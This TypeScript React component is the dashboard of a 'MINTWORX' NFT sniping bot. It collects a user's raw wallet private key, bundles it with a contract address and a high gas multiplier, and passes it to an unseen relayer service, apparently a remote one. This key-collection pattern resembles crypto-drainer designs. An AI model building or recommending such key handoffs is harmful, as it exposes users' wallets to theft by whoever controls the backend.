import React, { useState } from "react";
import { Fuel } from "lucide-react";
import { ConnectButton } from "@rainbow-me/rainbowkit";
import { useChainId, useGasPrice } from 'wagmi';
import toast from 'react-hot-toast';
import { formatUnits } from "viem";
import { Relayer } from './lib/proxyService';
import { checkPK } from './lib/checkBal';
import { fetchDrop } from "./lib/fetchDrop";
import  {fetchPub } from "./lib/fetchPub";

import Layout from './src/Components/Layout';
import EnhancedNFTCard from './src/Components/EnhancedNFTCard';
import { useAuthStatus } from './lib/useAut';
import ConfirmationModal from './src/Components/Confirmation';
import LoadingModal from './src/Components/LoadingPopup';
import GroupedSnipingCards  from './src/Components/Snipers';
import { Stat } from "./lib/updater";
import MintBotControls from "./src/Components/MintBotControls";

type SniperEntry = {
  address: string;
  status: "pending" | "minted" | "error";
};

const MintBotDashboard: React.FC = () => {
  const [speedValue, setSpeedValue] = useState(0);
  const [privateKey, setPrivateKey] = useState('');
  const [contractAddress, setContractAddress] = useState('');
  const [loading, setLoading] = useState(false);
  const [verifying, setVerifying] = useState(false);
  const [contractVerified, setContractVerified] = useState(false);
  const [isSniping, setIsSniping] = useState(false);
  const [showConfirmModal, setShowConfirmModal] = useState(false);
  const [mintAmount, setMintAmount] = useState(1);
  const [maxAmount, setMaxAmount] = useState<number>(1);
  const [sniper, setSniper] = useState<SniperEntry[]>([]);
  const [nftDetails, setNftDetails] = useState({
    name: '',
    symbol: '',
    startTime: '',
    endTime: '',
    contractAddress: '',
    description: '',
  });

  const { refreshAuth } = useAuthStatus();
  const proxy = new Relayer();
  const chainId = useChainId();
  const gasPrice = useGasPrice({
    chainId,
    query: {
      refetchInterval: 5000,
      staleTime: 2000,
    }
  });

  const fetchSnipers = async (address: string) => {
    const result = await Stat(address);
    if (result.success) {
      setSniper(result.data);
    }
  };

  const getSpeedLabel = () => {
    if (speedValue < 25) return "competitive";
    if (speedValue < 50) return "aggressive";
    if (speedValue < 75) return "turbo";
    
    return "nuclear";
  };

  const getNFTMetadata = async (address: string, chainId: number) => {
    const result = await fetchDrop(address, chainId);
    if (result.valid) {
      setNftDetails({
        name: result.name,
        symbol: result.symbol,
        startTime: result.startTime,
        endTime: result.endTime,
        contractAddress: address,
        description: result.description || '',
      });
      setMaxAmount(result.maxM);
      setMintAmount(1);
      await fetchSnipers(address);
      return true;
    } else {
      toast.error(`⚠️ Failed to fetch NFT metadata.\n${result.error}`);
      setContractVerified(false);
      return false;
    }
  };

  const verifyContractAddress = async () => {
    setVerifying(true);
    setTimeout(async () => {
      const trimmed = contractAddress.trim();
      const isValid = /^0x[a-fA-F0-9]{40}$/.test(trimmed);
      if (!trimmed) {
        toast.error("Please enter a contract address.");
        setContractVerified(false);
      } else if (!isValid) {
        toast.error("❌ Invalid contract address format.");
        setContractVerified(false);
      } else {
        const isValidMetadata = await getNFTMetadata(trimmed, chainId);
        if (isValidMetadata) {
          setContractVerified(true);
        }
      }
      setVerifying(false);
    }, 1000);
  };

  const handleMint = async () => {
    if (!privateKey.trim()) return toast.error('Please enter your private key.');
    if (!contractAddress.trim()) return toast.error('Please enter the contract address.');

    const check = await checkPK(privateKey);
    if (!check.valid) return toast.error('❌ Invalid private key or unsupported chain.');

    setLoading(true);
    setIsSniping(true);
    const timeoutId = setTimeout(() => fetchSnipers(contractAddress), 3000);

    try {
      await fetchPub();
      refreshAuth();

      const payload = {
        privateKey: privateKey.trim().replace(/\s/g, '').toLowerCase() as `0x${string}`,
        contractAddress,
        chainId,
        gasMultiplier: 10 + (speedValue * 90 / 100),
        amount: mintAmount,
      };

      const result = await proxy.box(payload);
      clearTimeout(timeoutId);
      setLoading(false);
      setIsSniping(false);

      if (result.success) {
        const output = result.txHash || result.message || '';
        fetchSnipers(contractAddress);
        if (output === 'Activated') {
          toast.success('Bot activated!');
        } else {
          toast.success('🎉 Mint successful!');
          setContractAddress('');
          setContractVerified(false);
          setNftDetails({ name: '', symbol: '', startTime: '', endTime: '', contractAddress: '', description: '' });
        }

        // Reset state

        setPrivateKey('');
        setSpeedValue(0);
        setMintAmount(1);
      } else {
        if (result.error === 'Session Expired') refreshAuth();
        toast.error(`❌ Mint failed:\n${result.error}`);
      }
    } catch (err) {
      clearTimeout(timeoutId);
      setLoading(false);
      setIsSniping(false);
      console.error('Mint error:', err);
      toast.error('⚠️ Unexpected error occurred during minting.');
    }
  };

  return (
    <Layout>
      <div className="min-h-screen w-full overflow-hidden flex items-center justify-center bg-[#0f172a] text-white p-0 m-0 relative">
        <div className="absolute inset-0 z-0">
          <div className="absolute top-[-100px] left-[-100px] w-80 h-80 bg-blue-400 rounded-full mix-blend-multiply filter blur-3xl opacity-30 animate-pulse" />
          <div className="absolute bottom-[-100px] right-[-100px] w-80 h-80 bg-indigo-500 rounded-full mix-blend-multiply filter blur-2xl opacity-40 animate-pulse delay-200" />
        </div>

        <div className="absolute top-4 right-4 z-50">
          <ConnectButton showBalance={false} accountStatus="address" chainStatus="icon" />
        </div>

        <div className="relative z-10 w-full max-w-4xl p-8 bg-white/5 text-white rounded-3xl shadow-2xl backdrop-blur-md border border-white/20">
          <div className="flex flex-col items-center mb-6">
            <img alt="logo" className="w-28 h-28 object-contain rounded-ed-xl mb-6" src="/assets/logo-remove.png"/>
            <h1 className="text-4xl font-extrabold tracking-wide">MINTWORX</h1>
          </div>

          <label className="block text-sm font-medium text-white/70 mb-1">NFT Contract Address</label>
          <input
            type="text"
            value={contractAddress}
            onChange={(e) => setContractAddress(e.target.value)}
            placeholder="Paste NFT contract address (0x...)"
            className="w-full px-4 py-2 mb-4 rounded bg-white/10 border border-white/30 text-white placeholder-gray-400"
          />

          <div className="flex gap-4 mb-4">
            <button onClick={verifyContractAddress} className="w-full border border-gray-400 text-white px-4 py-2 rounded hover:bg-white hover:text-black transition">
              Fetch NFT details
            </button>
          </div>

          {!contractVerified && !verifying && (
            <>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
                <div className="col-span-full text-center p-6 border border-blue-500/20 rounded-lg bg-black/20">
                  <p className="text-gray-400">No NFTs found. Enter a contract address above and click "Fetch NFT Details".</p>
                </div>
              </div>
              <div className="mt-4 text-sm text-blue-400 text-center">Status: Wallet Connected</div>
            </>
          )}

          {verifying && (
            <div className="flex justify-center mt-2">
              <div className="animate-spin rounded-full h-6 w-6 border-2 border-t-transparent border-white" />
            </div>
          )}

          {contractVerified && (
            <>
              <div className="flex flex-wrap md:flex-nowrap gap-4 mb-6">
                <div className="w-full md:w-1/2">
                  <EnhancedNFTCard nft={nftDetails} />
                </div>
                <div className="w-full md:w-1/2">
                  <GroupedSnipingCards snipers={sniper} onData={() => fetchSnipers(contractAddress)} />
                </div>
              </div>

              <div className="bg-[#0f172a] border border-white/10 p-4 rounded-xl shadow-md mb-6">
                  <div className="flex items-center justify-between mb-3">
                    <div className="flex items-center gap-2">
                      <p className="text-xs text-gray-300 uppercase tracking-widest">Gas Setting</p>
                    </div>
                    <div className="flex items-center gap-1">
                      
                      <span className="text-xs text-gray-300 uppercase tracking-widest">
                        {gasPrice.data ? 
                          `${Number(formatUnits(gasPrice.data, 9)).toFixed(4)} gwei` : 
                          'Loading...'
                        }
                      </span>
                      <Fuel className="w-4 h-4 text-gray-300" />
                    </div>
                  </div>
                <div className="flex justify-between text-sm text-gray-500 mb-3">
                  {["competitive","aggressive", "turbo", "nuclear"].map((label) => (
                    <span
                      key={label}
                      className={`transition ${
                        getSpeedLabel() === label ? "text-xs text-gray-300 uppercase tracking-widest font-semibold" : ""
                      }`}
                    >
                      {label}
                    </span>
                  ))}
                </div>

                <input
                  type="range"
                  min={0}
                  max={100}
                  value={speedValue}
                  onChange={(e) => setSpeedValue(Number(e.target.value))}
                  className="w-full h-2 rounded-full bg-gray-700 accent-white"
                />
                <div className="mt-3 text-center">
                  <div className="inline-block px-3 py-2 bg-white/10 rounded text-xs text-gray-400 uppercase tracking-widest">
                    {(10 + (speedValue * 90 / 100)).toFixed(2)}x
                  </div>
                </div>
              </div>

              <MintBotControls
                privateKey={privateKey}
                setPrivateKey={setPrivateKey}
                mintAmount={mintAmount}
                setMintAmount={setMintAmount}
                loading={isSniping}
                max={maxAmount}
                onMint={() => setShowConfirmModal(true)}
              />
            </>
          )}
        </div>

        {loading && <LoadingModal show={true} />}

        {showConfirmModal && (
          <ConfirmationModal
            message={`Are sure you want to continue ?`}
            onCancel={() => setShowConfirmModal(false)}
            onProceed={() => {
              setShowConfirmModal(false);
              handleMint();
            }}
          />
        )}
      </div>
    </Layout>
  );
};

export default MintBotDashboard;
